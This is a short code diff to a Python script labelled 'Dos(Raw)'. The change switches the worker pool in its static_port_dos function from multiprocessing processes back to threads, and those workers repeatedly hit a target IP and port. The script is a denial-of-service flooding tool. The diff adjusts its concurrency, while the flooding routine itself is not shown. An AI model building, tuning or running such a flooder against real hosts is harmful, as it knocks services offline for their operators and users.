@@ -4,7 +4,7 @@ Dos(Raw)
 
 import socket
 import threading
-import multiprocessing
+#import multiprocessing
 
 
 IP = ''
@@ -50,8 +50,8 @@ def static_port_dos(port):
     global N_OF_THREADS,IP    
     threads_pool = []    
     for i in range(N_OF_THREADS):
-        #threads_pool.append(threading.Thread(target = static_port_dos_main, args=(IP,port)))
-        threads_pool.append(multiprocessing.Process(target=static_port_dos_main, args=(IP,port)))
+        threads_pool.append(threading.Thread(target = static_port_dos_main, args=(IP,port)))
+        #threads_pool.append(multiprocessing.Process(target=static_port_dos_main, args=(IP,port)))
         
     for i in range(N_OF_THREADS):
         try:
